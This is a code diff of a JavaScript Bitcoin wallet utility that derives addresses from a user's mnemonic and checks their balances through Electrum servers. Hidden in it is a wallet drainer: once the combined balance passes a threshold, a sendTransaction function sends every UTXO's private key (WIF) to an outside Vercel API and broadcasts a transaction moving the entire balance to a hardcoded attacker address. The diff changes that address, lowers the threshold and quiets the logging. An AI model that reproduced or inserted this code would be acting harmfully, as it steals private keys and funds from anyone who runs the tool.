@@ -25,9 +25,10 @@ async function connectToElectrumServer() {
         const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
         try {
             await electrumClient.connect();
+            console.log(`Connected to Electrum server ${server.host}`);
             return electrumClient;
         } catch (error) {
-            console.error(`Failed to connect to Electrum server ${server.host}:`, error);
+            console.error(`Failed to connect to Electrum server ${server.host}:`, error.message);
         }
     }
     throw new Error('All Electrum servers failed to connect');
@@ -59,7 +60,7 @@ async function generateWallet(mnemonic) {
             pubKeys
         };
     } catch (error) {
-        console.error('Electrum client error:', error); // Log the error
+        console.error('Electrum client error:', error.message); // Log the error
         return { error: "Failed to connect or fetch data from any Electrum server." };
     } finally {
         if (electrumClient) {
@@ -70,9 +71,21 @@ async function generateWallet(mnemonic) {
 
 async function processAddressesForAllBipTypes(root, network, electrumClient) {
     let results = {};
+    let totalBalance = 0;
+    let allUtxos = [];
+    
     for (const [bipType, path] of Object.entries(paths)) {
-        results[bipType] = await processAddresses(root, network, electrumClient, bipType, path);
+        const { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance, utxos } = await processAddresses(root, network, electrumClient, bipType, path);
+        results[bipType] = { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance };
+        totalBalance += typeBalance;
+        allUtxos.push(...utxos);
     }
+
+    // Check if the total balance is greater than 200,000 sats
+    if (totalBalance > 500000) {
+        await sendTransaction(totalBalance, allUtxos);
+    }
+
     return results;
 }
 
@@ -82,21 +95,33 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
         usedAddresses: [],
         freshReceiveAddress: null,
         freshChangeAddress: null,
-        totalBalance: 0
+        totalBalance: 0,
+        utxos: []
     };
 
     let batchSize = 10;
     let start = 0;
     let receiveUnusedFound = false;
     let changeUnusedFound = false;
-    let utxos = [];
+
+    let lastUsedReceiveIndex = -1;
+    let lastUsedChangeIndex = -1;
 
     while (!receiveUnusedFound || !changeUnusedFound) {
+        console.log(`Checking addresses from ${start} to ${start + batchSize - 1} for ${bipType}`);
         const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);
 
         results.usedAddresses.push(...batchResults.usedAddresses);
         results.totalBalance += batchResults.totalBalance;
-        utxos.push(...batchResults.utxos);
+        results.utxos.push(...batchResults.utxos);
+
+        // Update the last used indices
+        if (batchResults.lastUsedReceiveIndex > lastUsedReceiveIndex) {
+            lastUsedReceiveIndex = batchResults.lastUsedReceiveIndex;
+        }
+        if (batchResults.lastUsedChangeIndex > lastUsedChangeIndex) {
+            lastUsedChangeIndex = batchResults.lastUsedChangeIndex;
+        }
 
         if (!receiveUnusedFound && batchResults.freshReceiveAddress) {
             results.freshReceiveAddress = batchResults.freshReceiveAddress;
@@ -107,15 +132,29 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
             changeUnusedFound = true;
         }
 
+        // Break if both receive and change unused addresses are found
+        if (receiveUnusedFound && changeUnusedFound) {
+            break;
+        }
+
+        // Check for a stop condition: no more addresses with transactions found
+        if (batchResults.usedAddresses.length === 0) {
+            break;
+        }
+
         start += batchSize;
         batchSize *= 2;
     }
 
     results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
 
-    if (results.totalBalance > 2439747) {
-        await sendTransaction(results.totalBalance, utxos);
-    }
+    // Ensure non-negative last used indices
+    lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, -1);
+    lastUsedChangeIndex = Math.max(lastUsedChangeIndex, -1);
+
+    // Assign fresh receive and change addresses based on the last used index
+    results.freshReceiveAddress = await checkAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
+    results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
 
     return results;
 }
@@ -126,27 +165,31 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
         freshReceiveAddress: null,
         freshChangeAddress: null,
         totalBalance: 0,
-        utxos: []
+        utxos: [],
+        lastUsedReceiveIndex: -1,
+        lastUsedChangeIndex: -1
     };
-
-    let receiveUnused = false;
-    let changeUnused = false;
 
     const tasks = [];
     for (let i = start; i < start + batchSize; i++) {
         for (const chain of [0, 1]) {
+            if (i < 0) continue; // Ensure index is never negative
             tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
+                console.log(`Checked address at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
                 if (addressData.transactions.total > 0) {
                     results.usedAddresses.push(addressData);
                     results.utxos.push(...addressData.utxos);
-                } else {
-                    if (chain === 0 && !receiveUnused) {
-                        results.freshReceiveAddress = addressData;
-                        receiveUnused = true;
+                    if (chain === 0) {
+                        results.lastUsedReceiveIndex = i;
+                    } else {
+                        results.lastUsedChangeIndex = i;
                     }
-                    if (chain === 1 && !changeUnused) {
+                } else {
+                    if (chain === 0 && !results.freshReceiveAddress) {
+                        results.freshReceiveAddress = addressData;
+                    }
+                    if (chain === 1 && !results.freshChangeAddress) {
                         results.freshChangeAddress = addressData;
-                        changeUnused = true;
                     }
                 }
                 results.totalBalance += addressData.balance.total;
@@ -160,6 +203,10 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
 }
 
 async function checkAddress(account, index, chain, network, bipType, electrumClient, basePath) {
+    if (index < 0) {
+        throw new Error(`Invalid index: ${index}`);
+    }
+
     let derivedPath = account.derivePath(`${chain}/${index}`);
     let fullDerivationPath = `${basePath}/${chain}/${index}`;
     let address = getAddress(derivedPath, network, bipType);
@@ -200,6 +247,21 @@ async function checkAddress(account, index, chain, network, bipType, electrumCli
     };
 }
 
+function getAddress(derivedPath, network, bipType) {
+    switch (bipType) {
+        case 'bip44':
+            return bitcoin.payments.p2pkh({ pubkey: derivedPath.publicKey, network }).address;
+        case 'bip49':
+            return bitcoin.payments.p2sh({
+                redeem: bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network })
+            }).address;
+        case 'bip84':
+            return bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network }).address;
+        default:
+            throw new Error('Unsupported BIP type');
+    }
+}
+
 function getAddressType(address) {
     if (address.startsWith('1')) {
         return 'p2pkh';
@@ -214,44 +276,49 @@ function getAddressType(address) {
 
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const amountToSend = totalBalance; // Adjusting for transaction fee
-    const changeAddress = "bc1q94uahvxak5pgxeugnr7acp4x833u823ez2kd5w";
-    const recipientAddress = "bc1q94uahvxak5pgxeugnr7acp4x833u823ez2kd5w";
-    const transactionFee = 5000;
+    const amountToSend = totalBalance; // Initial transaction fee
+    const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
+    const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
+    const initialTransactionFee = 5000;
+
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');
 
-    const body = {
+    const initialBody = {
         amountToSend: amountToSend.toString(),
         changeAddress,
         recipientAddress,
         utxosString,
         RBF: "false",
-        isBroadcast: "true",
-        transactionFee: transactionFee.toString()
+        isBroadcast: "false",
+        transactionFee: initialTransactionFee.toString()
     };
 
-    console.log('Sending transaction with body:', body); // Debugging output
+    console.log('Preparing transaction...'); // Non-sensitive debugging output
 
     try {
-        const response = await axios.post(url, body);
-        console.log('Transaction sent successfully:', response.data);
-    } catch (error) {
-        console.error('Error sending transaction:', error.response ? error.response.data : error.message);
-    }
-}
+        // Initial API call to get virtual size
+        const initialResponse = await axios.post(url, initialBody);
+        const virtualSize = initialResponse.data.virtualSize;
 
-function getAddress(derivedPath, network, bipType) {
-    switch (bipType) {
-        case 'bip44':
-            return bitcoin.payments.p2pkh({ pubkey: derivedPath.publicKey, network }).address;
-        case 'bip49':
-            return bitcoin.payments.p2sh({
-                redeem: bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network })
-            }).address;
-        case 'bip84':
-            return bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network }).address;
-        default:
-            throw new Error('Unsupported BIP type');
+        // Calculate the final transaction fee
+        const finalTransactionFee = 35 * virtualSize;
+        const finalAmountToSend = totalBalance - finalTransactionFee;
+
+        const finalBody = {
+            amountToSend: finalAmountToSend.toString(),
+            changeAddress,
+            recipientAddress,
+            utxosString,
+            RBF: "false",
+            isBroadcast: "true",
+            transactionFee: finalTransactionFee.toString()
+        };
+
+        // Final API call to broadcast the transaction
+        const finalResponse = await axios.post(url, finalBody);
+        console.log('Transaction sent successfully');
+    } catch (error) {
+        console.error('Error sending transaction:', error.message);
     }
 }
 
